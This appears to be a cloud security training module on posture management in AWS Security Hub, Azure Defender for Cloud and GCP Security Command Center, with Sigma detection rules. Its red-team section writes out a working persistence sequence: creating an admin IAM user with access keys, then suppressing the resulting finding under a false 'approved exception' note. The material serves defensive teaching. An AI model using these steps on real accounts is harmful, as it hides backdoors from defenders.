# 04 — Posture Management per Cloud

> **Level:** Intermediate
> **Prereqs:** [Audit Log Retention & Immutability](audit-log-retention-and-immutability.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Discovery, Privilege Escalation, Defense Evasion
> **Authorization scope:** Posture scoring dashboards and finding suppression workflows must be exercised only in your own sandbox accounts/subscriptions/projects.

## What & why

Cloud Security Posture Management (CSPM) is the continuous assessment of your cloud environment against security best practices and compliance frameworks. It produces a "posture score," a list of active findings (misconfigurations), and recommendations ranked by severity. Each cloud provider ships a native CSPM: AWS Security Hub, Azure Defender for Cloud, GCP Security Command Center. Your job: integrate posture findings into your operational workflow so they don't rot in a dashboard nobody reads.

## The OnPrem reality

Pre-cloud posture was periodic: a Nessus credentialed scan every week, a spreadsheet tracking remediation for each finding, and a quarterly report that was a snapshot, not a stream. Findings aged out silently — a host that was noncompliant on Tuesday might be clean on Wednesday, and nobody tracked the delta. Cloud CSPM is continuous by default, which is both powerful (near-real-time) and dangerous (alert fatigue if not tuned).

## Cross-cloud CSPM comparison

| Feature | AWS Security Hub | Azure Defender for Cloud | GCP Security Command Center | OnPrem |
|---|---|---|---|---|
| **Posture score** | Security Hub score (0–100%) | Secure Score (percentage + recommendations) | Posture score (0.0–1.0) in SCC Enterprise | Nessus CVSS average, custom dashboards |
| **Finding sources** | Config rules, GuardDuty, Inspector, Macie, IAM Access Analyzer, Firewall Manager, third-party | Azure Policy, Defender plans, built-in assessments | Security Health Analytics, Event Threat Detection, Container Threat Detection | Nessus, OpenSCAP, Qualys, Lynis |
| **Framework mapping** | CIS AWS Foundations, PCI DSS, NIST CSF, custom frameworks | CIS, PCI DSS, ISO 27001, NIST SP 800-53, HIPAA, FedRAMP, custom | CIS GCP, PCI DSS, ISO 27001, NIST SP 800-53, SOC 2, HIPAA | Manual mapping in GRC tool |
| **Suppression** | Workflow status + note on finding | Exemption (with category + expiry) | Snooze + mute (time-bound) | Excel "risk accepted" column |
| **Automated remediation** | Security Hub custom actions → Lambda | Logic Apps triggered from workflow automation | SCC → Cloud Functions, Pub/Sub → Cloud Functions | Ansible/Puppet from scan results |
| **SIEM export** | EventBridge → S3 → SIEM, Security Hub findings to EventBridge | Continuous export to Event Hub / Log Analytics workspace | Pub/Sub → Chronicle / Splunk / SIEM | syslog → SIEM |
| **Multi-cloud/account** | AWS Organizations integration + Security Hub cross-Region aggregation | Management group hierarchy + Azure Lighthouse | GCP organization hierarchy | Central Nessus manager |

## AWS — Security Hub deep dive

### Enabling Security Hub across an organization

```bash
# Management account: delegate Security Hub admin
aws securityhub enable-organization-admin-account \
  --admin-account-id 222222222222

# Admin account: enable standards
aws securityhub batch-enable-standards \
  --standards-subscription-requests '[
    {"StandardsArn": "arn:aws:securityhub:us-east-1::standards/aws-foundational-security-best-practices/v/1.0.0"},
    {"StandardsArn": "arn:aws:securityhub:us-east-1::standards/cis-aws-foundations-benchmark/v/1.4.0"},
    {"StandardsArn": "arn:aws:securityhub:us-east-1::standards/pci-dss/v/3.2.1"}
  ]'

# Enable auto-enable for member accounts
aws securityhub update-organization-configuration --auto-enable
```

### Querying findings by severity

```bash
aws securityhub get-findings \
  --filters '{
    "SeverityNormalized": [{"Gte": 70}],
    "WorkflowStatus": [{"Value": "NEW", "Comparison": "EQUALS"}],
    "RecordState": [{"Value": "ACTIVE", "Comparison": "EQUALS"}]
  }' \
  --query "Findings[*].{id:Id, title:Title, severity:Severity.Normalized, resource:Resources[0].Id}" \
  --output table
```

### Suppression workflow

```bash
aws securityhub update-findings \
  --filters '{"Id": [{"Value": "arn:aws:securityhub:us-east-1:111111111111:subscription/cis-aws-foundations-benchmark/v/1.4.0/1.4/finding/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"}],
  --workflow '{"Status": "SUPPRESSED"}' \
  --note '{"Text": "Suppressed per exception ticket SHIELD-421; expiry 2026-09-22", "UpdatedBy": "security-eng@example.com"}'
```

### Integration to Slack/PagerDuty

```hcl
resource "aws_cloudwatch_event_rule" "security_hub_high" {
  name        = "security-hub-high-severity"
  description = "Forward Security Hub HIGH/CRITICAL findings to Lambda"
  event_pattern = jsonencode({
    source      = ["aws.securityhub"]
    detail-type = ["Security Hub Findings - Imported"]
    detail = {
      findings = {
        Severity = { Label = ["HIGH", "CRITICAL"] }
        Workflow = { Status = ["NEW"] }
      }
    }
  })
}

resource "aws_cloudwatch_event_target" "pagerduty" {
  rule = aws_cloudwatch_event_rule.security_hub_high.name
  arn  = aws_lambda_function.securityhub_pagerduty.arn
}
```

## Azure — Defender for Cloud deep dive

### Secure Score and regulatory compliance

```bash
# View current secure score
az security secure-score list --query "[].{score:properties.score.current, max:properties.score.max, percentage:properties.score.percentage}"

# List compliance status per standard
az security regulatory-compliance-assessments list \
  --standard-name "CIS-Microsoft-Azure-Foundations-Benchmark-v2.0.0" \
  --query "[?status=='Unhealthy'].{name:displayName, description:description}" -o table
```

### Continuous export to Log Analytics

```bash
az security setting create \
  --name Sentinel \
  --setting '{
    "kind": "DataExportSettings",
    "properties": {"enabled": true}
  }'

# Export security findings to Event Hub
az security assessment-metadata list
```

### Exemption workflow (Azure)

```bash
az security assessment-metadata show \
  --name "151e82c0-8ed8-4b24-8b3e-76d04b4e68ab"  # Example assessment ID

# Create exemption
az security assessment create \
  --name "exemption-001" \
  --resource-id "/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-sandbox" \
  --status "Exempt" \
  --additional-data '{"reason": "Approved exception: staging environment", "expiry": "2026-09-22"}'
```

### Integration to Teams/Logic App

```yaml
# Azure Logic App trigger on Defender for Cloud alert
trigger:
  type: "When a response to an Azure Security Center alert is triggered"
  inputs: {}
actions:
  send_teams_message:
    type: "Send message in Teams channel"
    inputs:
      host:
        connection:
          name: "teams_connection"
      method: "post"
      body:
        text: "@body('Parse_JSON')?.AlertDisplayName"
```

## GCP — Security Command Center deep dive

### Enabling SCC Premium

```bash
gcloud services enable securitycenter.googleapis.com --organization=000000000000

gcloud scc settings describe --organization=000000000000

# List active findings
gcloud scc findings list --organization=000000000000 \
  --filter="state=\"ACTIVE\" AND severity=\"HIGH\" OR severity=\"CRITICAL\"" \
  --format="table(finding.category, finding.resourceName, finding.severity)"
```

### Posture management — SCC Enterprise tier

```bash
# List posture deployments (posture-as-code)
gcloud scc postures list --organization=000000000000

# Describe a posture
gcloud scc postures describe organizations/000000000000/locations/global/postures/cis-benchmark-v1.3.0

# Check posture drift
gcloud scc posture-templates list --organization=000000000000
```

### Finding snooze/Mute

```bash
gcloud scc findings update findingName \
  --organization=000000000000 \
  --source=000000000000-sources-8888888888888888888 \
  --state="INACTIVE" \
  --mute="MUTED"

# Mute with time-bound expiry (SCC API)
# (as of June 2026, time-bound muting is available via the SCC API with an `expiryTime` field;
# check `gcloud scc findings update --help` and the REST API for current flag support)
```

### Export to SIEM via Pub/Sub

```bash
gcloud scc notifications create scc-to-siem \
  --organization=000000000000 \
  --pubsub-topic="projects/sec-pipeline/topics/scc-notifications" \
  --filter="state=\"ACTIVE\" AND (severity=\"HIGH\" OR severity=\"CRITICAL\")"
```

## OnPrem — posture management

| Tool | Score model | Export format | Automated response |
|---|---|---|---|
| Nessus Professional | CVSS-based per host | `.nessus` (XML) | API → scripted ticket creation |
| OpenSCAP | Pass/Fail per rule | XCCDF Results (XML) + HTML report | Shell script post-scan |
| Wazuh | Custom scoring per agent | JSON events → Elasticsearch | Active response (agent-side block) |
| Chef InSpec | Pass/Fail per control | JSON | CI pipeline gate |

```bash
# InSpec compliance profile
inspec exec cis-dil-benchmark --reporter json:/tmp/inspec-results.json
jq '.profiles[0].controls[] | {id, status: .results[0].status}' /tmp/inspec-results.json
```

## 🔴 Red Team view — alert suppression as persistence

**Attack vector:** An attacker with `securityhub:UpdateFindings` or equivalent privileges suppresses a finding for a misconfiguration they introduced. The finding disappears from the dashboard, but the vulnerability stays. This is T1562 (Impair Defenses) in cloud context.

**Contained exploitation (sandbox-only):**

```bash
# Attacker acquires credentials that can update Security Hub findings
# (e.g., via compromised CI/CD role that has securityhub:* permissions)

# Step 1: Attacker creates a persistence backdoor — e.g., an IAM user
aws iam create-user --user-name support-ops
aws iam attach-user-policy \
  --user-name support-ops \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name support-ops

# Step 2: Security Hub detects "IAMUserWithAdministratorAccess" finding
# Finding ID: arn:aws:securityhub:us-east-1:111111111111:subscription/...

# Step 3: Attacker suppresses the finding permanently
aws securityhub update-findings \
  --filters '{"Title": [{"Value": "IAM.5 IAM users should not have administrator access"}]}' \
  --workflow '{"Status": "SUPPRESSED"}' \
  --note '{"Text": "False positive — approved exception", "UpdatedBy": "attacker@example.com"}'

# Step 4: Finding disappears from Security Hub dashboard.
# Attacker's IAM user persists, undetected by CSPM for potentially months.

# Azure equivalent
az security assessment update \
  --name "assessment-id" \
  --status '{"code": "NotApplicable", "cause": "OffByPolicy", "description": "Approved exception"}'

# GCP equivalent
gcloud scc findings update findingName ... --mute="MUTED"
```

**Artifacts left:**
- CloudTrail `UpdateFindings` event in Security Hub service logs
- Audit log shows the `UpdatedBy` field with the attacker's ARN
- The suppressed finding still exists (RecordState=ACTIVE, WorkflowStatus=SUPPRESSED)
- If suppression is tracked, a delta between finding creation time and suppression time < 1 hour is suspicious

## 🔵 Blue Team view — suppression governance

### Mandatory suppression ticket + expiry

```yaml
suppression_policy:
  requires: "JIRA ticket with manager approval"
  max_duration: "90 days"
  mandatory_fields:
    - ticket_id
    - approver_email
    - risk_justification
    - expiry_date
    - compensating_control_ref
  auto_revive: true  # finding re-fires after expiry if still noncompliant
```

### Nightly inventory of aged suppressions

```sql
-- AWS Config advanced query — findings suppressed > 30 days
SELECT
  resourceId,
  configuration.workflowStatus,
  configuration.note.updatedAt
WHERE resourceType = 'AWS::SecurityHub::Finding'
  AND configuration.workflowStatus = 'SUPPRESSED'
  AND configuration.note.updatedAt < date_sub(current_date, interval 30 day)
```

```bash
# Azure — list exemptions older than 30 days
az security assessment list \
  --query "[?status.code=='NotApplicable']"

# GCP — list muted findings
gcloud scc findings list --organization=000000000000 \
  --filter="state=\"INACTIVE\" AND mute=\"MUTED\"" \
  --format="table(finding.name, finding.createTime, finding.muteUpdateTime)"
```

### Detection rule — suppression of a finding shortly after creation

```yaml
title: Security Finding Suppressed Within 24h of Creation
id: d4e5f6a7-7000-4000-8000-b8c9d0e1f2a3
status: experimental
description: Finding created and immediately suppressed — possible defense evasion
logsource:
  product: aws
  service: cloudtrail
detection:
  finding_created:
    eventSource: securityhub.amazonaws.com
    eventName: BatchImportFindings
  finding_suppressed:
    eventSource: securityhub.amazonaws.com
    eventName: BatchUpdateFindings
    requestParameters.workflow.status: SUPPRESSED
  timeframe: 24h
  condition: finding_created and finding_suppressed (same resource)
level: high
```

## Hands-on lab — posture drill

**Duration:** 15 min. **Cost:** Free-tier CSPM usage.

```bash
# AWS: Enable Security Hub, wait 2h for initial findings, then score
aws securityhub get-findings \
  --filters '{"ComplianceStatus": [{"Value": "FAILED"}]}' \
  --query "length(Findings)" 

# Azure: View secure score and recommendation count
az security secure-score list
az security assessment list --query "[?status.code=='Unhealthy'].displayName"

# GCP: List top 10 findings by severity
gcloud scc findings list --organization=000000000000 \
  --filter="state=\"ACTIVE\"" --limit=10 \
  --format="table(finding.category, finding.severity)"
```

## Detection rules & checklists

**CSPM health check (monthly):**

- [ ] CSPM enabled on 100% of accounts/subscriptions/projects.
- [ ] All framework standards enabled (not just the default).
- [ ] Continuous export to SIEM configured and receiving data.
- [ ] Zero suppressed findings older than 90 days.
- [ ] Auto-remediation configured for top 5 recurring findings.
- [ ] Supression requires ticket + approver + expiry.
- [ ] Weekly posture score trend reviewed — if score drops > 5%, investigate.

**Sigma rule — suppressed finding reactivated:**

```yaml
title: Suppressed Security Finding Reactivated
id: e5f6a7b8-8000-4000-8000-c9d0e1f2a3b4
status: experimental
description: A previously suppressed finding was reactivated (exception expired or revoked)
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventSource: securityhub.amazonaws.com
    eventName: BatchUpdateFindings
    requestParameters.workflow.status:
      - NEW
      - NOTIFIED
  condition: selection
level: medium
```

## References

- [AWS Security Hub](https://docs.aws.amazon.com/securityhub/latest/userguide/what-is-securityhub.html)
- [Azure Defender for Cloud](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-cloud-introduction)
- [GCP Security Command Center](https://cloud.google.com/security-command-center/docs/concepts-security-command-center-overview)
- MITRE ATT&CK: T1562 Impair Defenses (suppression), T1078 Valid Accounts (persistence via suppressed finding)
- Cross-links: [../Monitoring-Detection-SIEM/native-threat-detection-guardduty-defender-scc.md](../Monitoring-Detection-SIEM/native-threat-detection-guardduty-defender-scc.md), [../Blue-Team-Defense/remediation-automation.md](../Blue-Team-Defense/remediation-automation.md)
